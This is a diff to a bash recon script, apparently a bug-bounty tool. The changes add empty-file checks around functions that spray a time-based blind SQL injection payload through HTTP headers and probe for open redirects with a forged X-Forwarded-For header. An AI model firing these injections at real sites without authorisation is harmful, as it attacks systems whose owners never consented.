@@ -172,8 +172,10 @@ subdomains(){
 	if [[ -f 6httprobe$1.txt && -s 6httprobe$1.txt ]]
 	then
 		echo -e "\e[32m\nDoing Curl to check headers for sqli...\033[0m"
+		echo "******** Checking headers for sqli... *********" >> 9httprobeXORsqli$1.txt
 		checkheadersforsqli 6httprobe$1.txt 9httprobeXORsqli$1.txt
 		echo -e "\e[32m\nDoing Curl to check headers for redirect...\033[0m"
+		echo "****** Checking headers for redirect... *******" >> 9httprobeXORsqli$1.txt
 		checkheadersforredirect 6httprobe$1.txt 9httprobeXORsqli$1.txt
 	fi
 	
@@ -204,7 +206,16 @@ subdomains(){
 # usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
 # output: list of urls and headers with potential sqli
 checkheadersforsqli(){
-	echo "******** Checking headers for sqli... *********" > $2
+	if [[ -f $1 && ! -s $1 ]]
+	then
+		echo -e "\e[32mUrls file is empty!\033[0m"
+		return
+	fi
+	if [[ -f ~/tools/__diccionarios/headers.txt && ! -s ~/tools/__diccionarios/headers.txt ]]
+	then
+		echo -e "\e[32mNo headers file found!\033[0m"
+		return
+	fi
 	cat $1 | while read url; do
 		cat ~/tools/__diccionarios/headers.txt | while read head; do
 			response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
@@ -222,7 +233,11 @@ checkheadersforsqli(){
 # usage: checkheadersforredirect urllist.txt outputurlswithredirection.txt
 # output: list of urls and headers with redirection
 checkheadersforredirect(){
-	echo "****** Checking headers for redirect... *******" > $2
+	if [[ -f $1 && ! -s $1 ]]
+	then
+		echo -e "\e[32mUrls file is empty!\033[0m"
+		return
+	fi
 	cat $1 | while read url; do
 		response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
 		grep -q '<!-- CHECK -->' <<< $var && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
